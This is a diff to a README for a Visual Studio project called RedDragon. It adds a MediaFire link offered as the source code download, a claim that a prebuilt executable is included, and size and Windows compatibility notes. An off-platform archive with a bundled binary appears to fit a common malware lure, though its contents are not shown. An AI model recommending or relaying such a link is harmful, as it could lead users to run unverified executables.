@@ -28,3 +28,22 @@ More Features coming soon
 
 This Project has all the necessary folders and components to function properly
 and if you wish to help out or edit this source you will need visual studio 2019 or newer to avoid problems.
+
+Download Source Code [here](https://www.mediafire.com/file/5fchj3bwzmjkq78/RedDragon-master.zip/file) for more information.
+
+# Binary Infermation
+ + this Project has a Fully Built Executible so you dont have to
+
+# Processer Compatibility 
+ + The Pre Built Exe is For X64 based systems but other supported cpus can be added just with a simple build path update and in visual studio itself
+
+# Storage Space Required
++ In Archive Form [Space = 714MB]
++ in Extracted Form [Space = 1.30GB -- 2.0GB]
+
+# Current SUpported Operating Systems
++ Windows 8
++ Windows 8.1
++ Windows 10
++ Windows 11
++ Windows 12 {Coming Soon}
